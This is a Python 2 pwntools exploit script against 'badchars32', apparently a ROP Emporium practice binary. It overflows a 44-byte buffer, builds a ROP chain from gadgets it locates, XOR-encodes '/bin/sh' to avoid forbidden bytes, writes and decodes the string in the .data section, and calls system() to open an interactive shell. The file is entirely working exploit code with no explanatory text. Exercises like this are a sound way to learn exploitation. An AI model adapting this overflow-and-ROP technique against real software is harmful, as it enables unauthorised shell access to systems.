#!/usr/bin/env python2

from pwn import *

def attach_gdb(p):
    context.terminal=['tmux','splitw','-v']
    gdb.attach(proc.pidof(p)[0], '''b *0x08048890\nc''')

e=ELF("./badchars32")
gadgets=lambda x: next(e.search(asm(x)))
xor_ebx_cl=     gadgets("xor byte ptr [ebx], cl ; ret")
pop_ebx_ecx=    gadgets("pop ebx ; pop ecx ; ret")
pop_esi_edi=    gadgets("pop esi ; pop edi ; ret")
mov_edi_esi=    gadgets("mov dword ptr [edi], esi ; ret")
system=e.symbols["system"]
data_addr=e.get_section_by_name(".data").header.sh_addr

log.info("{} @ {}".format("xor_ebx_cl".ljust(30," "),hex(xor_ebx_cl)))
log.info("{} @ {}".format("pop_ebx_ecx".ljust(30," "),hex(pop_ebx_ecx)))
log.info("{} @ {}".format("pop_esi_edi".ljust(30," "),hex(pop_esi_edi)))
log.info("{} @ {}".format("mov dword ptr [edi], esi".ljust(30," "),hex(mov_edi_esi)))
log.info("{} @ {}".format("system".ljust(30," "),hex(system)))
log.info("{} @ {}".format("data section".ljust(30," "),hex(data_addr)))

badchars=[]

for b in "bic fns":
    badchars.append(ord(b))

xor_byte=1
while True:
    binsh=""
    for i in "/bin/sh\x00":
        c=ord(i)^xor_byte
        if c in badchars:
            xor_byte+=1
            break
        else:
            binsh+=chr(c)
    if len(binsh) == 8:
        break

log.info("Encoded variant: {}".format(binsh.encode('hex')))

payload="A"*44
payload+=p32(pop_esi_edi)
payload+=binsh[:4]
payload+=p32(data_addr)
payload+=p32(mov_edi_esi)
payload+=p32(pop_esi_edi)
payload+=binsh[4:8]
payload+=p32(data_addr+4)
payload+=p32(mov_edi_esi)

for i in range(len(binsh)):
    payload+=p32(pop_ebx_ecx)
    payload+=p32(data_addr+i)
    payload+=p32(xor_byte)
    payload+=p32(xor_ebx_cl)

payload+=p32(system)
payload+="BBBB"
payload+=p32(data_addr)


io=process("./badchars32")
attach_gdb(io)

pid=util.proc.pidof(io)[0]

io.recvuntil('>')
io.sendline(payload)
io.clean()
io.interactive()



